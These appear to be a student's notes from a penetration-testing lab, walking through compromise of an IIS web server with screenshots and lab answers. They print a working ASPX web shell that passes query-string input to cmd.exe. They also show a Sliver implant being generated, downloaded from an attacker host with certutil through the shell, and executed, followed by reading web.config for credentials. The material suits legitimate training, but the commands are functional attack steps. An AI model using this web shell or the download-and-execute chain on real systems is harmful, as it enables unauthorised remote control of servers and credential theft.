# [Probing the Surface](Probing%20the%20Surface.md)

![](Screenshot%202026-11-03%20at%2015.23.56.png)

Modified staged.txt -> cmd.aspx

```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
    protected void Page_Load(object sender, EventArgs e) {
        string cmd = Request.QueryString["cmd"];
        if (cmd != null) {
            Process p = new Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = "/c " + cmd;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.UseShellExecute = false;
            p.Start();
            Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
        }
    }
</script>
```

Then upload onto web to get web shell

![](Screenshot%202026-11-03%20at%2015.38.01.png)

Generate implant EXE

```bash
generate --http 10.10.15.52:8080 --save /tmp/implant.exe
```

![](Screenshot%202026-11-03%20at%2015.39.20.png)

Host a server

![](Screenshot%202026-11-03%20at%2015.41.28.png)

Using web shell to download

```
http://10.129.205.234/uploads/cmd?cmd=certutil -urlcache -split -f http://10.10.15.52:1234/implant.exe C:\Windows\Temp\i.exe
```

Execute

```
http://10.129.205.234/uploads/cmd?cmd=C:\Windows\Temp\i.exe
```

![](Screenshot%202026-11-03%20at%2015.43.49.png)
### Assess further the web application and submit the name of the database user

```sh
execute -o cmd.exe /c "type C:\\inetpub\\wwwroot\\web.config"
```

![](Screenshot%202026-11-03%20at%2015.49.44.png)
### What is the name of the user from the session captured in Sliver

**`IIS APPPOOL\DefaultAppPool`**

![](Screenshot%202026-11-03%20at%2015.51.07.png)
### Submit the contents of the text file located at C:\Users\Public

```sh
cat C:\\Users\\Public\\user.txt
```

![](Screenshot%202026-11-03%20at%2015.47.55.png)